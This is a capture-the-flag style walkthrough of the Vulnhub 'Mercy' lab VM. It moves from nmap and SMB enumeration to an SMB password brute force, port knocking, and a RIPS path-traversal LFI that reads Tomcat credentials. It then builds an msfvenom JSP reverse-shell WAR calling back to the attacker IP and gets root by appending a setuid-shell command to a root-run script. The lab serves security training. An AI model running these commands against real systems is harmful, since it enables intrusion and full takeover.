---
layout: post
title: Vulnhub Mercy Walkthrough
categories: [Vulnhub]
tags: [lfi]
toc: true
image:
  path: /assets/images/mercy/15.png
  alt: image alternative text
---

---

## Recon
### Nmap
First we run nmap scan on the target machine ip :
```
nmap -p- -sV --open -sC -Pn 192.168.1.10
PORT     STATE SERVICE     VERSION
53/tcp   open  domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
110/tcp  open  pop3?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
445/tcp  open  netbios-ssn 44 (workgroup: WORKGROUP)
993/tcp  open  ssl/imap    Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
995/tcp  open  ssl/pop3s?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
| http-methods: 
|_  Potentially risky methods: PUT DELETE
MAC Address: 08:00:27:E7:33:85 (Oracle VirtualBox virtual NIC)
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

nmap results gave us  8 ports as shown in the next table:


| Port | Service | Version |
| -------- | -------- | -------- |
| `8080 `   | Tomcat  | Apache Tomcat/Coyote JSP engine 1.1    |
|`53`|DNS|ISC BIND 
|`110`|POP3| N/A
|`139`|netbios-ssn|Samba smbd 3.X - 4.X
|`143`|imap|Dovecot imapd
|`445`|netbios-ssn|Samba smbd 4.3.11-Ubuntu
|`993`|ssl/imap|Dovecot imapd
|`995`|ssl/pop3s|N/A

## Enumeration :
### SMB :
Lets check if the host permit `smb null sessions` using `enum4linux`:
```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                 
                                                                                                                                                            
S-1-22-1-1000 Unix User\pleadformercy (Local User)                                                                                                          
S-1-22-1-1001 Unix User\qiu (Local User)
S-1-22-1-1002 Unix User\thisisasuperduperlonguser (Local User)
S-1-22-1-1003 Unix User\fluffy (Local User)

```

We find 3 system level users from the output of `enum4linux` :
```
qiu
thisisasuperduperlonguser
fluffy
```

#### Smbmap
using smbmap we notice we have a share called `qiu` , sounds like a share for our discovered user qiu , but the access is denied :
```
smbmap -H 192.168.1.10 -u '' -p ''          

    ________  ___      ___  _______   ___      ___       __         ______

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 192.168.1.10:445        Name: 192.168.1.10              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        qiu                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (MERCY server (Samba, Ubuntu))

```
so we can try to bruteforce using msfconsole scanner `auxiliary/scanner/smb/smb_login `
using our discovered users and rockyou.txt wordlist :

```
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 192.168.1.10/qiu
rhosts => 192.168.1.10/qiu
msf6 auxiliary(scanner/smb/smb_login) > set verbose true
verbose => true
msf6 auxiliary(scanner/smb/smb_login) > set user_file users.txt
user_file => users.txt
msf6 auxiliary(scanner/smb/smb_login) > run

```
![](/assets/images/mercy/1.png)

we got valid credentials `qiu:password`  that we can now use to connect to  the share :

![](/assets/images/mercy/2.png)

we will get every interesting files to our attacker machine :

![](/assets/images/mercy/3.png)

### Port Knocking:
one file stands out which is the `config` file that holds the configuration of prot knocking :

![](/assets/images/mercy/4.png)

### Port 80:
sof if we need to open port `80` we have to knock on  this sequence of ports: `159,27391,4
` using `netcat` :

![](/assets/images/mercy/5.png)

we run a nmap scan to verify that port  `80` has opened :

![](/assets/images/mercy/6.png)

the robots.txt file present to endpoints :

![](/assets/images/mercy/7.png)

#### Local File Inclusion :

The `nomercy` endpoint has an application called `RIPS 0.53 `

![](/assets/images/mercy/8.png)

so we use `searschploit` to find any exploits for it , and we got one `LFI `:

![](/assets/images/mercy/9.png)

The poc is this : 

```
http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd
```

we try it on our target :

![](/assets/images/mercy/10.png)

We try to escalate this LFI to Remote code execution through log poisoning , ssh keys , Proc/self/environ ... but with no result

since we do have a tomcat server , how about looking for tomcat config located at `etc/tomcat7/tomcat-users.xml` file through this LFI :

![](/assets/images/mercy/11.png)

now we found some valid creds lets login to tomcat manager using thisisasuperduperlonguser :

```
"thisisasuperduperlonguser" password="heartbreakisinevitable" 
"fluffy" password="freakishfluffybunny" 
```

![](/assets/images/mercy/12.png)

we create a payload using msfvenom :

```
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.1.19 -f war -o levay.war LPORT=1
```

and upload it using the tomcat manager  while starting a netcat listener on our box :

![](/assets/images/mercy/13.png)

Now we have shell that needs to be upgraded :

![](/assets/images/mercy/14.png)

we enumerated qiu with password `password ` and tomcat users home directories but with no results ,

since we have fluffy creds we can switch our user to fluffy and upgrade our shell :

```
su fluffy

fluffy@MERCY:~/.private/secrets$
```
The .private/secrets/timeclock file is belonging to root so we can append our payload and gain root privileges :

```
echo "cp /bin/dash /var/tmp/dash ; chmod u+s /var/tmp/dash" >> timeclock

```
we go to /var/tmp and see if our dash binary is there after few moments  :
```
fluffy@MERCY:~/.private/secrets$ cd /var/tmp/
fluffy@MERCY:/var/tmp$ ls
dash
fluffy@MERCY:/var/tmp$ ./dash
# id
uid=1003(fluffy) gid=1003(fluffy) euid=0(root) groups=0(root),1003(fluffy)

```
